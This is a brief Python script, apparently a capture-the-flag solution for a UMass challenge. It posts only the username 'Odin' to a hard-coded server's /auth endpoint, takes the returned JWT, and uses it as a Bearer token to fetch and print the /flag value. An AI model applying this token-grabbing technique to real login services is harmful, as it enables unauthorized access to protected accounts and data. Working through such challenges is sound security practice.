#!/usr/bin/python3
import requests
import re

url1 = 'http://104.197.195.221:8081/auth'
url2 = 'http://104.197.195.221:8081/flag'

params = {'username': 'Odin', 'submit': 'Enter'}

response1 = requests.post(url1, data=params)
json1 = response1.json()
jwt = json1['access_token']
#print(jwt)

header = {'Authorization': 'Bearer ' + jwt}
#print(header)

response2 = requests.get(url2, headers=header)
json2 = response2.json()
flag = json2['flag']

print(flag)

#source = response2.text
#print(re.findall(r'(UMASS\{.+\})', source)[0])